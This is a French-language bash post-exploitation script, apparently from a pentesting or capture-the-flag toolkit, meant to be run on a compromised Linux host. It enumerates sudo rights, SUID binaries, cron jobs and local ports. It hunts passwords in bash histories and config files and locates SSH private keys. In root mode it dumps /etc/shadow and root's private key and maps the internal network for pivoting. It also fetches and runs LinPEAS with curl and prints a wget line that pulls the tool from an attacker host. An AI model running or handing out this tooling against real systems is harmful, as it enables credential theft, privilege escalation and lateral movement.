#!/bin/bash
# post-linux.sh — Checklist post-exploitation Linux en une commande
# Usage: ./post-linux.sh [--root] [--upload-linpeas]
# Ou copier-coller les commandes directement sur la cible
#
# Lance sur la cible compromise (après avoir un shell stable)
# --root        : mode post-ROOT (récupère shadow, ssh key, etc.)
# --upload      : upload et lance LinPEAS automatiquement

R='\033[0;31m'; G='\033[0;32m'; Y='\033[1;33m'; C='\033[0;36m'; B='\033[1m'; NC='\033[0m'

MODE="user"
UPLOAD_LINPEAS=false

for arg in "$@"; do
    [[ "$arg" == "--root" ]] && MODE="root"
    [[ "$arg" == "--upload" ]] && UPLOAD_LINPEAS=true
done

OUTFILE="./post-linux-$(hostname)-$(date +%Y%m%d-%H%M).md"

echo -e "${B}${C}"
echo "╔═══════════════════════════════════════════╗"
echo "║   post-linux.sh — $(hostname)"
echo "║   Mode : $MODE"
echo "╚═══════════════════════════════════════════╝"
echo -e "${NC}"

header() {
    echo ""
    echo -e "${B}━━━ $1 ━━━${NC}"
    echo "" >> "$OUTFILE"
    echo "## $1" >> "$OUTFILE"
    echo "" >> "$OUTFILE"
    echo '```' >> "$OUTFILE"
}

footer() {
    echo '```' >> "$OUTFILE"
    echo "" >> "$OUTFILE"
}

run() {
    echo -e "  ${Y}→${NC} $1"
    eval "$1" 2>/dev/null | tee -a "$OUTFILE" || true
}

# Init rapport
{
    echo "# 🐧 Post-Linux — $(hostname)"
    echo ""
    echo "**Date :** $(date +"%Y-%m-%d %H:%M")"
    echo "**Host :** $(hostname)"
    echo "**Mode :** $MODE"
    echo ""
    echo "---"
    echo ""
} > "$OUTFILE"

# ───────────────────────────────────────
# CONTEXTE IMMÉDIAT
# ───────────────────────────────────────
header "1. Contexte (PREMIER CHECK)"
echo "whoami: $(whoami) | id: $(id)"
echo "hostname: $(hostname)"
echo "IP: $(ip -4 -br a 2>/dev/null | grep -v lo || hostname -I)"
echo ""
run "cat /etc/os-release 2>/dev/null | head -5 || uname -a"
run "uname -r"
footer

# ───────────────────────────────────────
# SUDO
# ───────────────────────────────────────
header "2. sudo -l (CRITIQUE)"
run "sudo -l"
footer

echo -e "  ${Y}→ Vérifier chaque binaire sur : https://gtfobins.github.io/${NC}"
echo "**→ Vérifier GTFOBins pour chaque binaire : https://gtfobins.github.io/**" >> "$OUTFILE"
echo "" >> "$OUTFILE"

# ───────────────────────────────────────
# GROUPES
# ───────────────────────────────────────
header "3. Groupes (docker/lxd/disk/adm)"
run "id"
run "groups"
footer

# Check groupes dangereux
GROUPS_OUT=$(groups 2>/dev/null)
for dangerous in docker lxd lxc disk adm sudo wheel; do
    if echo "$GROUPS_OUT" | grep -qw "$dangerous"; then
        echo -e "  ${R}[!!!] GROUPE DANGEREUX : $dangerous${NC}"
        echo "**⚠️ GROUPE DANGEREUX : $dangerous**" >> "$OUTFILE"
        echo "" >> "$OUTFILE"
    fi
done

# ───────────────────────────────────────
# SUID/CAPABILITIES
# ───────────────────────────────────────
header "4. SUID binaries"
run "find / -perm -u=s -type f 2>/dev/null | grep -v snap"
footer

header "5. Capabilities"
run "getcap -r / 2>/dev/null"
footer

# ───────────────────────────────────────
# CRON JOBS
# ───────────────────────────────────────
header "6. Cron jobs"
run "crontab -l"
run "cat /etc/crontab"
run "ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/ 2>/dev/null"
footer

# ───────────────────────────────────────
# SERVICES / PORTS LOCAUX
# ───────────────────────────────────────
header "7. Ports localhost (pas visibles de l'extérieur)"
run "ss -tlnp | grep -v LISTEN"
run "netstat -tlnp 2>/dev/null | grep 127"
footer

# ───────────────────────────────────────
# CREDENTIAL HUNTING
# ───────────────────────────────────────
header "8. Credential hunting"
echo -e "  ${Y}→${NC} Historique bash..."
run "cat ~/.bash_history | grep -iE 'pass|pwd|secret|key|token|ssh|mysql|ftp' | head -20"
echo ""
run "cat /home/*/.bash_history 2>/dev/null | grep -iE 'pass|pwd' | head -10"
footer

header "9. Fichiers de config (web, db, etc.)"
run "find /var/www /opt /srv /home -name 'web.config' -o -name 'config.php' -o -name '.env' -o -name 'appsettings.json' 2>/dev/null | head -20"
run "find / -name '*.conf' -o -name '*.config' 2>/dev/null | xargs grep -l 'password\|passwd' 2>/dev/null | grep -v proc | head -10"
footer

# ───────────────────────────────────────
# SSH KEYS
# ───────────────────────────────────────
header "10. Clés SSH"
run "find / -name 'id_rsa' -o -name 'id_ed25519' -o -name 'authorized_keys' 2>/dev/null"
run "ls -la ~/.ssh/ 2>/dev/null"
footer

# ───────────────────────────────────────
# POST-ROOT SPÉCIFIQUE
# ───────────────────────────────────────
if [[ "$MODE" == "root" ]]; then
    echo ""
    echo -e "${R}${B}━━━ MODE ROOT ━━━${NC}"
    echo ""

    header "ROOT.1 — SSH Key de root (PRIORITÉ #1)"
    echo -e "  ${R}[!!!] Copier cette clé pour mouvement latéral${NC}"
    run "cat /root/.ssh/id_rsa 2>/dev/null || echo '(pas de clé SSH root)'"
    run "cat /root/.ssh/authorized_keys 2>/dev/null"
    footer

    header "ROOT.2 — /etc/shadow"
    run "cat /etc/shadow"
    footer

    header "ROOT.3 — Historique root"
    run "cat /root/.bash_history"
    footer

    header "ROOT.4 — Réseau interne (pivot)"
    run "ip -4 -br a"
    run "ip route"
    run "cat /etc/hosts"
    run "arp -a 2>/dev/null"
    footer

    header "ROOT.5 — NFS exposé (re-check depuis root)"
    run "showmount -e localhost 2>/dev/null"
    run "cat /etc/exports 2>/dev/null"
    footer

    echo -e "${Y}Si réseau interne découvert → configurer Ligolo :${NC}"
    echo -e "  ${G}../post/setup-ligolo.sh <SUBNET>${NC}"
    echo "" >> "$OUTFILE"
    echo "**→ Réseau interne découvert → configurer Ligolo-ng**" >> "$OUTFILE"
    echo "" >> "$OUTFILE"
fi

# ───────────────────────────────────────
# LINPEAS
# ───────────────────────────────────────
echo "" >> "$OUTFILE"
echo "---" >> "$OUTFILE"
echo "" >> "$OUTFILE"
echo "## LinPEAS" >> "$OUTFILE"
echo "" >> "$OUTFILE"

if $UPLOAD_LINPEAS; then
    echo -e "${C}[~] Téléchargement LinPEAS...${NC}"
    curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/linpeas.sh 2>/dev/null && \
        chmod +x /tmp/linpeas.sh && \
        echo -e "${G}[✓] LinPEAS téléchargé — lancement...${NC}" && \
        /tmp/linpeas.sh 2>/dev/null | tee -a "$OUTFILE" || \
        echo -e "${R}[✗] Impossible de télécharger LinPEAS${NC}"
else
    echo '```bash' >> "$OUTFILE"
    echo "# Uploader et lancer LinPEAS depuis Kali :" >> "$OUTFILE"
    echo "# Sur Kali : python3 -m http.server 8080" >> "$OUTFILE"
    echo "wget http://KALI_IP:8080/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh | tee linpeas_out.txt" >> "$OUTFILE"
    echo '```' >> "$OUTFILE"
    echo "" >> "$OUTFILE"

    echo -e "${Y}LinPEAS non uploadé. Pour l'uploader :${NC}"
    echo -e "  Sur Kali : ${G}python3 -m http.server 8080${NC}"
    echo -e "  Sur cible : ${G}wget http://KALI_IP:8080/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh | tee linpeas_out.txt${NC}"
fi

# ───────────────────────────────────────
# RÉSUMÉ
# ───────────────────────────────────────
{
    echo ""
    echo "---"
    echo ""
    echo "## 📊 Résumé"
    echo ""
    echo "**Rapport :** \`$OUTFILE\`"
    echo ""
    echo "> **Coller dans** : \`07_Host.md\` → Section Enum Locale"
} >> "$OUTFILE"

echo ""
echo -e "${B}${G}╔═══════════════════════════════════════════╗${NC}"
echo -e "${B}${G}║     POST-LINUX CHECKLIST TERMINÉE        ║${NC}"
echo -e "${B}${G}╚═══════════════════════════════════════════╝${NC}"
echo ""
echo -e "  Rapport : ${B}$OUTFILE${NC}"
echo ""
echo -e "${Y}Prochaines étapes :${NC}"
echo -e "  1. Lire les résultats sudo -l et SUID"
echo -e "  2. Checker GTFOBins pour chaque binaire"
echo -e "  3. Lancer LinPEAS si pas encore fait"
echo -e "  4. Reporter le loot dans 03_LOOT.md"
